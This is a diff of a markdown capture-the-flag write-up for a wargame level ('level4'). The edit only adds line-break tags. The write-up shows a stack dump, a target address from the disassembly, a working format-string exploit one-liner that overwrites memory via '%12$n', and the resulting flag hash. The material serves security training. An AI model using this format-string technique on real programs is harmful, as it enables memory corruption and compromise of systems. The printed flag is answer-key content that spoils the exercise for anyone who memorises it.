@@ -21,7 +21,7 @@ AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff3
 ```
 A little bit harder but we could find it, checking the position we know our __address__ is being set on the stack at postion 12th so we get it done `%12\$n` and the address we have it from the disassembled code<br>
 `x0804848d <+54>:	mov    eax,ds:0x8049810`<br> Now we just need to build the *format string specifier*. <br>
-`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')"; cat -) | ./level4`
-[...]
-after some 16930111 space later
+`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')"; cat -) | ./level4` <br>
+[...]<br>
+after some 16930111 space later<br>
 `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
